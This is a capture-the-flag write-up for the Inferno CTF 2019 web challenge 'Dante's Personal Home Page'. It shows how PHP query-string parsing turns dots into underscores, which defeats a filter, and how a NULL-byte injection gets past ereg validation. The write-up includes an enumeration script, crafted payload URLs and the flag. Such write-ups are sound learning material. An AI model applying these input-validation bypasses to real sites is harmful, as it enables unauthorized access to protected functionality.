<h1>Inferno CTF 2019 â€“ Dante's Personal Home Page</h1>

<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Points:</strong> 180</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Dante has used some PHP on his site but it only allows magicians to enter. Show him your magical skills!!</p>
  
  <p>http://104.197.168.32:17011/</p>
  
  <p>Author : MrT4ntr4</p>
</blockquote>

<h2>Solution</h2>

<p>The website will show its own source code.</p>

<p>```php
<?php
include("flag.php");</p>

<p>if (isset ($<em>GET['<strong>magic</strong>'])) {
    $magic = $</em>GET['<strong>magic</strong>'];</p>

<pre><code>$check = urldecode($_SERVER['QUERY_STRING']); 

if(preg_match("/_| /i", $check)) 
{ 
    die("Get yourself some coffee"); 
} 

if (ereg ("^[a-zA-Z0-9]+$", $magic) === FALSE)
    echo 'Only Alphanumeric accepted';
else if (strpos ($magic, '$dark$') !== FALSE)
{
    if (!is_array($magic)){
        echo "Congratulations! FLAG is : ".$flag;
    }
    else{
        die("You darn!!");
    }
}
else
    {
        die("Your magic doesn't work on me");
    }
</code></pre>

<p>} else {
  show_source(<strong>FILE</strong>);
}
?>
```</p>

<p>There are a couple of checks that must be bypassed to get the flag.</p>

<p>The first part is the following.</p>

<p>```php
if (isset ($<em>GET['<strong>magic</strong>'])) {
    $magic = $</em>GET['<strong>magic</strong>'];</p>

<pre><code>$check = urldecode($_SERVER['QUERY_STRING']); 

if(preg_match("/_| /i", $check)) 
{ 
    die("Get yourself some coffee"); 
}
</code></pre>

<p>```</p>

<p>This check is pretty weird, because to bypass it you have to provide a GET parameter with underscores, but having a query string without underscores. So, yeah, there is a bit of magic, here...</p>

<p>According to <a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/">this website</a>, PHP performs some string manipulation on input parameters' names in order to remove, for example, whitespaces and to convert characters in underscores.</p>

<p>This behavior can be abused crafting a string with chars that are converted to underscores, but they are not.</p>

<p>You can write a simple script to enumerate these chars.</p>

<p>```php
<?php</p>

<p>foreach(
        [
            "{chr}{chr}magic<strong>",
            "</strong>magic{chr}{chr}"
        ] as $k =&gt; $arg) {
            for($i=0;$i&lt;=255;$i++) {
                echo "\033[999D\033[K\r";
                echo "[".$arg."] check ".bin2hex(chr($i))."";
                parse<em>str(str</em>replace("{chr}",chr($i),$arg)."=bla",$o);</p>

<pre><code>            if(isset($o["__magic__"])) {
                echo "\033[999D\033[K\r";
                echo $arg." -&gt; ".bin2hex(chr($i))." (".chr($i).")\n";
            }
        }
        echo "\033[999D\033[K\r";

        echo "\n";
}
</code></pre>

<p>```</p>

<p>The output of the script is the following.</p>

<p>``` <br />
{chr}{chr}magic<em>_ -> 2e (.)
{chr}{chr}magic</em>_ -> 5f (_)</p>

<p><em>_magic{chr}{chr} -> 20 ( )
_</em>magic{chr}{chr} -> 2b (+)
<em>_magic{chr}{chr} -> 2e (.)
_</em>magic{chr}{chr} -> 5f (_)
```</p>

<p>So you can use the <code>.</code> char to craft the URL.</p>

<p><code>
http://104.197.168.32:17011/?..magic..=foo
</code></p>

<p>The website will answer the following.</p>

<p><code>
Your magic doesn't work on me
</code></p>

<p>At this point, the other check to bypass is the following.</p>

<p><code>php
    if (ereg ("^[a-zA-Z0-9]+$", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo "Congratulations! FLAG is : ".$flag;
</code></p>

<p>So you can insert only alphanumeric chars, but you have to insert two <code>$</code> chars.</p>

<p>According to <a href="https://bugs.php.net/bug.php?id=44366">this website</a>, you can bypass the <code>ereg</code> instruction injecting a NULL byte. The result is a string that is correctly interpreted by <code>strpos</code> and, obviously, is not an array.</p>

<p>The final URL is the following.</p>

<p><code>
http://104.197.168.32:17011/?..magic..=foo%00$dark$
</code></p>

<p>The website will print the flag.</p>

<p><code>
Congratulations! FLAG is : infernoCTF{1_gu3ss_y0ur_m4g1c_was_w4y_t00_d4rk}
</code></p>
